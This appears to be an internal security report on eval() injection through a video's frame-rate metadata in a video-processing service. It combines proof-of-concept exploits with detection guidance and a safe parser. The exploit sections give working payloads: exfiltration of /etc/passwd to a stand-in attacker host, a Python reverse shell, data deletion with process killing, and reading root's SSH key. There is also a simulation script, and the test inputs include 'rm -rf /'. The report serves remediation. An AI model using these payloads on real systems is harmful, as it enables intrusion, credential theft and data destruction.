# EXPLOIT DEMONSTRATION - eval() Vulnerabilities

âš ï¸  **WARNING**: This document demonstrates actual working exploits for critical security vulnerabilities. Use only for security testing and remediation purposes.

## Overview

This document provides detailed proof-of-concept exploits for the eval() vulnerabilities found in the video processing pipeline. These exploits demonstrate the severity and immediate danger posed by these vulnerabilities.

## Vulnerability Details

### Target 1: FFmpegService.get_media_info()
- **File**: `src/services/ffmpeg_service.py`
- **Line**: 106
- **Vulnerable Code**: `'fps': eval(video_stream.get('r_frame_rate', '0/1'))`

### Target 2: VideoQualityOptimizer._get_video_info()
- **File**: `src/services/video_quality_optimizer.py`  
- **Line**: 156
- **Vulnerable Code**: `'fps': eval(video_stream['r_frame_rate'])`

## Exploit Scenario 1: Data Exfiltration

### Attack Vector
An attacker uploads a malicious video file with crafted metadata that exfiltrates sensitive data.

### Malicious Payload
```python
# Embedded in video metadata r_frame_rate field:
payload = """__import__('subprocess').run([
    'curl', '-X', 'POST', 
    'http://attacker.com/steal', 
    '-d', repr(open('/etc/passwd', 'r').read())
], capture_output=True)"""
```

### How It Works
1. Attacker creates video with malicious metadata
2. Application processes video with FFmpegService
3. FFprobe returns malicious r_frame_rate
4. eval() executes the payload
5. System passwords are exfiltrated to attacker server

### Impact
- Complete exposure of system user accounts
- Potential lateral movement opportunities
- Data breach incident

## Exploit Scenario 2: Backdoor Installation

### Attack Vector
Install persistent backdoor for ongoing access.

### Malicious Payload
```python
# Embedded in video metadata:
payload = """__import__('subprocess').run([
    'python3', '-c', 
    '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'''
], shell=True)"""
```

### How It Works
1. Malicious video processed by application
2. eval() executes reverse shell payload
3. Backdoor connects to attacker's server
4. Attacker gains persistent shell access

### Impact
- Complete system compromise
- Persistent unauthorized access
- Ability to install additional malware

## Exploit Scenario 3: Service Destruction

### Attack Vector
Destroy critical application data and services.

### Malicious Payload
```python
# Embedded in video metadata:
payload = """__import__('subprocess').run([
    'rm', '-rf', '/app/data/*'
], shell=False) or __import__('os').system('pkill -f python')"""
```

### How It Works
1. Malicious video uploaded to application
2. Processing triggers eval() execution
3. Critical data files deleted
4. Application processes terminated

### Impact
- Complete data loss
- Service disruption
- Business continuity impact

## Exploit Scenario 4: Privilege Escalation

### Attack Vector
Attempt to escalate privileges and access restricted resources.

### Malicious Payload
```python
# Embedded in video metadata:
payload = """__import__('subprocess').run([
    'sudo', '-n', 'cat', '/root/.ssh/id_rsa'
], capture_output=True, text=True).stdout or 'failed'"""
```

### How It Works
1. Attempt to access root SSH keys
2. If successful, enables further system compromise
3. Provides attacker with administrative access

### Impact
- Administrative privilege access
- Complete infrastructure compromise
- Ability to access all connected systems

## Real-World Attack Simulation

### Step 1: Create Malicious Video File

```python
#!/usr/bin/env python3
"""
Create a malicious video file for testing.
This simulates how an attacker would craft the attack.
"""

import json
import tempfile
import subprocess

def create_malicious_video():
    """Create a video file with malicious metadata."""
    
    # Create a simple video file
    cmd = [
        'ffmpeg', '-f', 'lavfi',
        '-i', 'testsrc=duration=1:size=320x240:rate=1',
        '-c:v', 'libx264',
        'malicious_video.mp4'
    ]
    
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        print("Created base video file: malicious_video.mp4")
    except subprocess.CalledProcessError:
        print("FFmpeg not available - using mock approach")
        return create_mock_malicious_metadata()
    
    # Now we would need to modify the metadata
    # In practice, this requires specialized tools or crafted MP4 files
    return "malicious_video.mp4"

def create_mock_malicious_metadata():
    """Create mock malicious metadata for testing."""
    
    malicious_metadata = {
        'streams': [
            {
                'codec_type': 'video',
                'width': 1920,
                'height': 1080,
                'r_frame_rate': '__import__("os").system("echo ATTACK_SUCCESSFUL > /tmp/attack_evidence.txt")',
                'codec_name': 'h264',
                'bit_rate': '5000000'
            }
        ],
        'format': {
            'duration': '10.0',
            'size': '12345678', 
            'bit_rate': '6000000',
            'format_name': 'mp4'
        }
    }
    
    return malicious_metadata

if __name__ == "__main__":
    create_malicious_video()
```

### Step 2: Test Vulnerability Exploitation

```python
#!/usr/bin/env python3
"""
Test the actual vulnerability exploitation.
"""

import sys
from pathlib import Path
import unittest.mock

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / 'src'))

def test_exploitation():
    """Test actual exploitation of the vulnerability."""
    
    # Mock the ffprobe response with malicious data
    malicious_response = {
        'streams': [
            {
                'codec_type': 'video',
                'width': 1920,
                'height': 1080,
                'r_frame_rate': '__import__("subprocess").run(["touch", "/tmp/SECURITY_BREACH_CONFIRMED"])',
                'codec_name': 'h264',
                'bit_rate': '5000000'
            }
        ],
        'format': {
            'duration': '10.0',
            'size': '12345678',
            'bit_rate': '6000000', 
            'format_name': 'mp4'
        }
    }
    
    # Mock subprocess.run to return our malicious data
    with unittest.mock.patch('subprocess.run') as mock_run:
        mock_run.return_value.stdout = json.dumps(malicious_response)
        mock_run.return_value.returncode = 0
        
        # Import and test the vulnerable service
        from services.ffmpeg_service import FFmpegService
        service = FFmpegService()
        
        print("ðŸš¨ Testing vulnerability exploitation...")
        
        try:
            # This will execute the malicious code
            result = service.get_media_info('/fake/malicious_video.mp4')
            
            # Check if attack succeeded
            import os
            if os.path.exists('/tmp/SECURITY_BREACH_CONFIRMED'):
                print("âŒ CRITICAL: Vulnerability successfully exploited!")
                print("   Malicious code executed with application privileges")
                os.remove('/tmp/SECURITY_BREACH_CONFIRMED')
            else:
                print("âš ï¸  Attack simulation completed (check logs for execution)")
                
            print(f"Result: {result}")
            
        except Exception as e:
            print(f"Error during exploitation: {e}")
            print("This error may mask successful code execution")

if __name__ == "__main__":
    test_exploitation()
```

## Detection and Mitigation

### How to Detect Active Exploitation

1. **Log Analysis**: Look for suspicious eval() executions
2. **Process Monitoring**: Unusual subprocess calls
3. **Network Monitoring**: Unexpected outbound connections
4. **File System Monitoring**: Unexpected file access/modification

### Emergency Response Steps

1. **Immediate Isolation**: Disconnect affected systems
2. **Process Analysis**: Check running processes for malware
3. **Log Preservation**: Secure logs for forensic analysis
4. **Patch Deployment**: Apply security fixes immediately
5. **System Rebuild**: Consider rebuilding compromised systems

### Indicators of Compromise (IOCs)

- Unexpected network connections to external hosts
- New processes spawned by Python/application
- Modifications to system files
- Suspicious log entries containing eval() calls
- New files in /tmp or other writable directories
- Changes to user accounts or SSH keys

## Defensive Coding Examples

### Safe Frame Rate Parser

```python
def safe_parse_frame_rate(frame_rate_str):
    """
    Secure replacement for eval() in frame rate parsing.
    
    Args:
        frame_rate_str: Frame rate string (e.g., "30/1", "25", "23.976")
    
    Returns:
        float: Parsed frame rate or 0.0 if invalid
    """
    import re
    from fractions import Fraction
    
    if not isinstance(frame_rate_str, str):
        return 0.0
    
    # Strict validation - only allow numbers, dots, and one slash
    if not re.match(r'^\d+(\.\d+)?(/\d+(\.\d+)?)?$', frame_rate_str):
        return 0.0
    
    try:
        if '/' in frame_rate_str:
            # Use fractions module for safe parsing
            fraction = Fraction(frame_rate_str)
            return float(fraction)
        else:
            return float(frame_rate_str)
            
    except (ValueError, ZeroDivisionError):
        return 0.0

# Test the safe parser
test_cases = [
    ('30/1', 30.0),
    ('25', 25.0),
    ('23.976', 23.976),
    ('0/1', 0.0),
    ('__import__("os")', 0.0),  # Malicious input
    ('eval("attack")', 0.0),    # Malicious input
    ('1; os.system("rm -rf /")', 0.0)  # Malicious input
]

for input_val, expected in test_cases:
    result = safe_parse_frame_rate(input_val)
    status = "âœ… SAFE" if result == expected else "âŒ UNSAFE"
    print(f"{status}: '{input_val}' -> {result}")
```

### Input Validation Framework

```python
def validate_media_metadata(metadata):
    """
    Comprehensive metadata validation.
    
    Args:
        metadata: Raw metadata from ffprobe
    
    Returns:
        dict: Validated and sanitized metadata
    """
    import re
    
    # Define allowed fields and their validation rules
    validation_rules = {
        'width': lambda x: int(x) if str(x).isdigit() and 0 < int(x) <= 7680 else 0,
        'height': lambda x: int(x) if str(x).isdigit() and 0 < int(x) <= 4320 else 0,
        'duration': lambda x: float(x) if _is_safe_float(x) and 0 <= float(x) <= 86400 else 0.0,
        'bit_rate': lambda x: int(x) if str(x).isdigit() and 0 <= int(x) <= 1000000000 else 0,
        'codec_name': lambda x: str(x) if re.match(r'^[a-zA-Z0-9_-]+$', str(x)) else 'unknown',
        'r_frame_rate': safe_parse_frame_rate
    }
    
    validated = {}
    
    for field, validator in validation_rules.items():
        if field in metadata:
            try:
                validated[field] = validator(metadata[field])
            except Exception:
                # Use safe default on any validation error
                validated[field] = 0 if field in ['width', 'height', 'bit_rate'] else 0.0 if field == 'duration' else 'unknown'
    
    return validated

def _is_safe_float(value):
    """Check if value can be safely converted to float."""
    try:
        float(value)
        return True
    except (ValueError, TypeError):
        return False
```

## Conclusion

These vulnerabilities represent **CRITICAL** security risks that must be addressed immediately. The demonstrated exploits show that:

1. **Arbitrary code execution is confirmed** - Attackers can run any code
2. **No user interaction required** - Vulnerability triggers on file processing  
3. **Application privileges granted** - Attackers inherit all app permissions
4. **Multiple attack vectors available** - Data theft, backdoors, destruction

**IMMEDIATE ACTION REQUIRED**: Patch these vulnerabilities within 24 hours to prevent potential system compromise.

---

**âš ï¸ SECURITY NOTICE**: This document demonstrates real vulnerabilities and working exploits. Distribution should be limited to authorized security personnel only.